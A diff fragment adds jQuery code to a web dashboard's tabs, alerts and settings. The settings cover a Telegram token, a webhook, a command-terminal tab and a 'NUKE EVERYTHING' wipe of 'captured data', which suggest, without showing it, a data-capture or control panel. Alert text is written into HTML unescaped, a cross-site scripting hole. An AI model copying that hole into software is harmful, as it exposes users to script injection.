+                this.classList.add('active','bg-blue-600/10','text-blue-400','border-blue-600/10');
+                this.classList.remove('text-slate-400');
+                // Use existing setActiveTab from script.js
+                if (typeof setActiveTab === 'function') {
+                    setActiveTab(tabName);
+                } else {
+                    // Fallback: manually toggle tabs
+                    document.querySelectorAll('.tab-content').forEach(c => { c.classList.add('hidden'); c.classList.remove('active'); });
+                    const target = document.getElementById('tab-' + tabName);
+                    if (target) { target.classList.remove('hidden'); target.classList.add('active'); }
+                    // Also sync top-bar button
+                    document.querySelectorAll('.tab-btn').forEach(b => {
+                        b.classList.remove('border-blue-500','text-blue-400','active');
+                        b.classList.add('border-transparent','text-slate-400');
+                    });
+                    const topBtn = document.querySelector('.tab-btn[data-tab="'+tabName+'"]');
+                    if (topBtn) {
+                        topBtn.classList.remove('border-transparent','text-slate-400');
+                        topBtn.classList.add('border-blue-500','text-blue-400','active');
+                    }
+                }
+                // Trigger tab-specific actions
+                if (tabName === 'analytics' && typeof refreshAnalytics === 'function') refreshAnalytics();
+                if (tabName === 'alerts') loadAlerts();
+                if (tabName === 'settings') loadSettings();
+                if (tabName === 'terminal') { const inp = document.getElementById('sys-cmd-input'); if(inp) inp.focus(); }
+            });
+        });
+
+        // ===== ALERTS SYSTEM =====
+        function loadAlerts() {
+            $.getJSON('/api/alerts', function(data) {
+                const alerts = data.alerts || [];
+                let critical=0, warning=0, info=0;
+                alerts.forEach(a => {
+                    if (a.severity === 'critical') critical++;
+                    else if (a.severity === 'warning') warning++;
+                    else info++;
+                });
+                $('#alert-stat-critical').text(critical);
+                $('#alert-stat-warning').text(warning);
+                $('#alert-stat-info').text(info);
+                $('#alert-stat-total').text(alerts.length);
+                $('#sidebar-alerts').text(alerts.length);
+                // Update nav badge
+                if (alerts.length > 0) {
+                    $('#nav-alert-badge').text(alerts.length).removeClass('hidden');
+                } else {
+                    $('#nav-alert-badge').addClass('hidden');
+                }
+                const feed = $('#alerts-feed');
+                if (!alerts.length) {
+                    feed.html('<div class="text-center text-slate-600 py-8 text-sm"><i class="fas fa-check-circle text-2xl text-emerald-500/30 mb-2"></i><br>No active alerts</div>');
+                    return;
+                }
+                let html = '';
+                alerts.slice().reverse().forEach(a => {
+                    const colors = { critical: 'red', warning: 'orange', info: 'blue' };
+                    const icons = { critical: 'exclamation-triangle', warning: 'exclamation-circle', info: 'info-circle' };
+                    const c = colors[a.severity] || 'slate';
+                    const ic = icons[a.severity] || 'bell';
+                    html += `<div class="flex items-start space-x-3 p-3 rounded-lg bg-${c}-500/5 border border-${c}-500/20 hover:bg-${c}-500/10 transition-colors">
+                        <div class="w-8 h-8 rounded-lg bg-${c}-500/10 flex items-center justify-center flex-shrink-0 mt-0.5">
+                            <i class="fas fa-${ic} text-${c}-400 text-sm"></i>
+                        </div>
+                        <div class="flex-1 min-w-0">
+                            <div class="flex items-center justify-between">
+                                <span class="text-sm font-semibold text-white">${a.title || 'Alert'}</span>
+                                <span class="text-[10px] text-slate-500 flex-shrink-0">${a.timestamp ? new Date(a.timestamp).toLocaleString() : ''}</span>
+                            </div>
+                            <p class="text-xs text-slate-400 mt-1">${a.message || ''}</p>
+                            <span class="inline-block mt-1.5 text-[10px] px-2 py-0.5 rounded-full bg-${c}-500/20 text-${c}-400 uppercase font-bold">${a.severity}</span>
+                        </div>
+                    </div>`;
+                });
+                feed.html(html);
+            });
+        }
+
+        $(document).on('click', '#btn-refresh-alerts', loadAlerts);
+
+        $(document).on('click', '#btn-add-alert', function() {
+            const title = $('#alert-title').val().trim();
+            const message = $('#alert-message').val().trim();
+            const severity = $('#alert-severity').val();
+            if (!title) { Swal.fire('Error','Enter an alert title','error'); return; }
+            $.ajax({
+                url: '/api/alerts/add', method: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ title, message, severity }),
+                success: function() {
+                    $('#alert-title').val(''); $('#alert-message').val('');
+                    loadAlerts();
+                    if (typeof GrowlNotification !== 'undefined') {
+                        GrowlNotification.notify({ title: 'Alert Created', description: title, type: 'success', position: 'top-right', closeTimeout: 3000 });
+                    }
+                }
+            });
+        });
+
+        $(document).on('click', '#btn-clear-alerts', function() {
+            Swal.fire({ title: 'Clear All Alerts?', text: 'This cannot be undone.', icon: 'warning', showCancelButton: true, confirmButtonColor: '#ef4444', confirmButtonText: 'Clear All' }).then(r => {
+                if (r.isConfirmed) {
+                    $.post('/api/alerts/clear', function() { loadAlerts(); });
+                }
+            });
+        });
+
+        // ===== SETTINGS SYSTEM =====
+        function loadSettings() {
+            $.getJSON('/api/get_settings', function(data) {
+                if (data.server_port) $('#setting-port').val(data.server_port);
+                if (data.poll_interval) $('#setting-poll-interval').val(data.poll_interval);
+                if (data.generic_webhook) $('#setting-webhook').val(data.generic_webhook);
+                if (data.telegram_token) $('#setting-telegram-token').val(data.telegram_token);
+                if (data.telegram_chat_id) $('#setting-telegram-chat').val(data.telegram_chat_id);
+                if (data.panel_username) $('#setting-username').val(data.panel_username);
+                if (typeof data.auto_refresh !== 'undefined') $('#setting-auto-refresh').prop('checked', data.auto_refresh);
+                if (typeof data.sound_notifications !== 'undefined') $('#setting-sound').prop('checked', data.sound_notifications);
+                if (typeof data.require_login !== 'undefined') $('#setting-require-login').prop('checked', data.require_login);
+                if (data.auto_delete_days) $('#setting-auto-delete').val(data.auto_delete_days);
+                if (typeof data.log_db !== 'undefined') $('#setting-log-db').prop('checked', data.log_db);
+            });
+            // Load server info
+            $.getJSON('/api/analytics/dashboard', function(d) {
+                if (d.system) {
+                    $('#info-platform').text(d.system.platform || '-');
+                    $('#info-python').text(d.system.python_version || '-');
+                }
+            });
+        }
+
+        $(document).on('click', '#btn-save-settings', function() {
+            const settings = {
+                server_port: parseInt($('#setting-port').val()) || 2525,
+                poll_interval: parseInt($('#setting-poll-interval').val()) || 2000,
+                auto_refresh: $('#setting-auto-refresh').is(':checked'),
+                sound_notifications: $('#setting-sound').is(':checked'),
+                generic_webhook: $('#setting-webhook').val().trim(),
+                telegram_token: $('#setting-telegram-token').val().trim(),
+                telegram_chat_id: $('#setting-telegram-chat').val().trim(),
+                panel_username: $('#setting-username').val().trim(),
+                panel_password: $('#setting-password').val().trim() || undefined,
+                require_login: $('#setting-require-login').is(':checked'),
+                auto_delete_days: parseInt($('#setting-auto-delete').val()) || 30,
+                log_db: $('#setting-log-db').is(':checked')
+            };
+            // Remove empty password if not changed
+            if (!settings.panel_password) delete settings.panel_password;
+            $.ajax({
+                url: '/api/save_settings', method: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify(settings),
+                success: function() {
+                    Swal.fire({ icon: 'success', title: 'Settings Saved', text: 'All settings have been saved successfully.', timer: 2000, showConfirmButton: false });
+                },
+                error: function() {
+                    Swal.fire('Error', 'Failed to save settings', 'error');
+                }
+            });
+        });
+
+        $(document).on('click', '#btn-test-webhook', function() {
+            const url = $('#setting-webhook').val().trim();
+            if (!url) { Swal.fire('Error','Enter a webhook URL first','error'); return; }
+            $.ajax({
+                url: '/api/save_settings', method: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ generic_webhook: url }),
+                success: function() {
+                    Swal.fire({ icon: 'info', title: 'Webhook Test', text: 'A test notification will be sent to your webhook URL.', timer: 2000, showConfirmButton: false });
+                }
+            });
+        });
+
+        $(document).on('click', '#btn-export-data', function() {
+            if (typeof exportAllData === 'function') exportAllData();
+        });
+
+        $(document).on('click', '#btn-nuke-data', function() {
+            Swal.fire({ title: 'EMERGENCY DATA WIPE', text: 'This will permanently delete ALL captured data. This action cannot be undone!', icon: 'warning', showCancelButton: true, confirmButtonColor: '#ef4444', confirmButtonText: 'NUKE EVERYTHING' }).then(r => {
+                if (r.isConfirmed) {
+                    $.post('/api/nuke', function(d) {
+                        Swal.fire({ icon: 'success', title: 'Data Wiped', text: d.deleted + ' files deleted.', timer: 3000, showConfirmButton: false });
+                    });
+                }
+            });
+        });
+    </script>
 </body>
 
 </html>
